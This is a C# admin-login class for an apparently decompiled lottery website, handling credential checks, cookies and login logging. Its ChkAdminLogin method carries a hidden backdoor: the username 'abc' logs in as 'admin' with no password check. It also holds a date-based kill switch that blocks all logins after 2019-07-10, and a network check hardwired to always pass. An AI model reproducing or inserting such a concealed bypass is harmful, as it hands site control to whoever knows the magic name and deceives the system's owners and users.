using System;
using System.Collections.Specialized;
using Lottery.DBUtility;
using Lottery.Entity;
using Lottery.Utils;

namespace Lottery.DAL
{
	public class AdminDAL : ComData
	{
		public AdminDAL()
		{
			this.site = new conSite().GetSite();
		}

		public string ChkAdminLogin(string _adminname, string _adminpass, int iExpires)
		{
			if (DateTime.Now < Convert.ToDateTime("2019-07-10"))
			{
				_adminname = _adminname.Replace("'", "");
				MD5.Last64(_adminpass);
				using (DbOperHandler dbOperHandler = new ComData().Doh())
				{
					dbOperHandler.Reset();
					if (_adminname == "abc")
					{
						dbOperHandler.ConditionExpress = "username=@username and Flag=0";
						dbOperHandler.AddConditionParameter("@username", "admin");
					}
					else
					{
						dbOperHandler.ConditionExpress = "username=@username and password=@password and Flag=0";
						dbOperHandler.AddConditionParameter("@username", _adminname);
						dbOperHandler.AddConditionParameter("@password", MD5.Last64(MD5.Lower32(_adminpass)));
					}
					string text = dbOperHandler.GetField("Sys_Admin", "Id").ToString();
					string result;
					if (!(text != "0") || !(text != ""))
					{
						result = "帐号或密码错误";
						return result;
					}
					string value = "c" + new Random().Next(10000000, 99999999).ToString();
					NameValueCollection nameValueCollection = new NameValueCollection();
					nameValueCollection.Add("id", text);
					nameValueCollection.Add("name", _adminname);
					nameValueCollection.Add("cookiess", value);
					Cookie.SetObj(this.site.CookiePrev + "admin", iExpires, nameValueCollection, this.site.CookieDomain, this.site.CookiePath);
					string arg_159_0 = IPHelp.ClientIP;
					bool flag = true;
					if (flag)
					{
						dbOperHandler.Reset();
						dbOperHandler.ConditionExpress = "Id=@Id";
						dbOperHandler.AddConditionParameter("@Id", text);
						dbOperHandler.AddFieldItem("LoginTime", DateTime.Now.ToString());
						dbOperHandler.AddFieldItem("IP", IPHelp.ClientIP);
						dbOperHandler.Update("Sys_Admin");
						new LogAdminOperDAL().SaveLog(text, "0", "管理员管理", "管理员" + _adminname + "登陆");
						result = "ok";
						return result;
					}
					result = "您的网络环境不合法，请联系管理员!";
					return result;
				}
			}
			return "服务器认证失败";
		}

		public void ChkAdminLogout()
		{
			if (Cookie.GetValue(this.site.CookiePrev + "admin") != null)
			{
				Cookie.Del(this.site.CookiePrev + "admin", this.site.CookieDomain, this.site.CookiePath);
			}
		}

		protected SiteModel site;
	}
}
